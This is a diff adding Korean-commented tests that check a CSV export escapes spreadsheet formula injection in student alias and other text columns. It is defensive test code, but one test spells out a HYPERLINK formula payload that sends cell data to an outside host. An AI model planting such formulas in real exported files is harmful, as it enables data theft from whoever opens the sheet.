@@ -589,3 +589,58 @@ describe('parseBackupJson과 저장소', () => {
     expect(replaceAll(sessions)).toEqual({ ok: true });
   });
 });
+
+// ---- CSV 수식 주입 ---------------------------------------------------------------
+// 별칭은 교사가 입력하거나 가져온 파일에서 온다. = + - @ 로 시작하는 글자는 엑셀·시트가 수식으로 실행한다
+// (=HYPERLINK(...)는 파일을 열 때 살아나 외부로 요청을 보낼 수 있다). 앞에 작은따옴표를 붙여 글자로 읽히게 한다.
+describe('toTrialCsv 수식 주입 방어', () => {
+  const aliasCell = (alias) => cell(toTrialCsv([sessionFixture({ studentAlias: alias, trialCount: 1 })]), 1, 'student_alias');
+
+  test('= + - @ 로 시작하는 별칭은 작은따옴표가 앞에 붙어 수식이 되지 않는다', () => {
+    expect(aliasCell('=1+1')).toBe("'=1+1");
+    expect(aliasCell('+1')).toBe("'+1");
+    expect(aliasCell('-1')).toBe("'-1");
+    expect(aliasCell('@SUM(A1)')).toBe("'@SUM(A1)");
+  });
+
+  test('실제 공격 문자열: 쉼표·큰따옴표가 있어 따옴표로 감싸야 하는 수식도 무력화된다 (CSV 이스케이프와 함께 동작)', () => {
+    const payload = '=HYPERLINK("http://example.com/?x="&A1,"클릭")';
+    const csv = toTrialCsv([sessionFixture({ studentAlias: payload, trialCount: 1 })]);
+    const parsed = parseCsv(csv); // 이스케이프를 실제로 풀어 읽는다
+    expect(parsed[1][columnIndex(csv, 'student_alias')]).toBe("'" + payload);
+    expect(parsed[1]).toHaveLength(headerLength(csv)); // 열이 밀리지 않는다
+    expect(csv.split(/\r\n/)[1].startsWith('"\'=HYPERLINK(')).toBe(true); // 원문의 줄에서도 첫 글자는 =가 아니다
+  });
+
+  test('시작이 아닌 자리의 = + - @ 는 그대로 둔다', () => {
+    for (const alias of ['a=b', '학생-1', '학생+1', 'mail@x', '1-2', '학생1']) expect(aliasCell(alias)).toBe(alias);
+  });
+
+  test('다른 글자 열(회차 id, 테마 id, 브라우저 등)에도 같은 방어가 걸린다', () => {
+    const device = { kind: '=cmd', screenW: 1, screenH: 2, dpr: 1, browser: '-x', inputKind: '@y', refreshHzEst: 60 };
+    const csv = toTrialCsv([sessionFixture({ id: '=id', themeId: '+theme', device, trialCount: 1 })]);
+    expect(cell(csv, 1, 'session_id')).toBe("'=id");
+    expect(cell(csv, 1, 'theme_id')).toBe("'+theme");
+    expect(cell(csv, 1, 'device_kind')).toBe("'=cmd");
+    expect(cell(csv, 1, 'browser')).toBe("'-x");
+    expect(cell(csv, 1, 'input_kind')).toBe("'@y");
+  });
+
+  test('숫자 칸에는 걸지 않는다 (음수도 숫자로 남는다)', () => {
+    const csv = toTrialCsv([sessionFixture({ responses: [go(-5, { index: 0 })], trialCount: 1 })]);
+    expect(cell(csv, 1, 'rt_ms')).toBe('-5');
+    expect(cell(csv, 1, 'trial_index')).toBe('0');
+    expect(cell(csv, 1, 'level')).toBe('2');
+  });
+
+  test('정상 자료의 CSV는 달라지지 않는다 (따옴표가 붙은 칸이 없다)', () => {
+    const csv = toTrialCsv([sessionFixture({ responses: [go(500), nogo(null)], trialCount: 2 })]);
+    expect(csv).not.toContain("'");
+  });
+
+  test('JSON 백업은 별칭을 고치지 않는다 (복원하면 원문 그대로여야 한다)', () => {
+    const s = sessionFixture({ studentAlias: '=1+1' });
+    const back = parseBackupJson(toBackupJson([s]));
+    expect(back.sessions[0].studentAlias).toBe('=1+1');
+  });
+});
